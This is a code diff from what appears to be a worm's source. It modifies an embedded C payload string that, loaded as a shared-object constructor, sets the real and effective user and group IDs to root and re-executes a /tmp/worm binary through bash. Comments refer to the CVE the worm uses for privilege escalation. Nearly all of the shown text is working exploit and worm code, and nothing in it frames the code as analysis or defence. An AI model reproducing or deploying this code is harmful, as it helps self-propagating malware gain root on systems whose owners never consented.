@@ -24,10 +24,13 @@
  *
  *       chdir("/");
  *
- *       execl("/bin/bash", "bash", "-i", "-c", "/tmp/worm &", NULL); // Executing another time the worm file with root privilegues 
+ *       // Executing the worm again with root
+ *       // When the root executation of the worm finishes
+ *       // the thread that invoked this CVE will end
+ *       execl("/bin/bash", "bash", "-i", "-c", "/tmp/worm", NULL); // Executing another time the worm file with root privilegues 
  * }
 */
-const char XOOT[] = "#include <stdlib.h>\n#include <unistd.h>\n\n__attribute__((constructor)) void xoot(void)\n{\n        setreuid(0,0);\n        setregid(0,0);\n\n        chdir(\"/\");\n\n        execl(\"/bin/bash\", \"bash\", \"-i\", \"-c\", \"/tmp/worm &\", NULL);\n}\n";
+const char XOOT[] = "#include <stdlib.h>\n#include <unistd.h>\n\n__attribute__((constructor)) void xoot(void)\n{\n        setreuid(0,0);\n        setregid(0,0);\n\n        chdir(\"/\");\n\n        execl(\"/bin/bash\", \"bash\", \"-i\", \"-c\", \"/tmp/worm\", NULL);\n}\n";
 
 /*
  * Auxiliar function for running commands in C using execvp
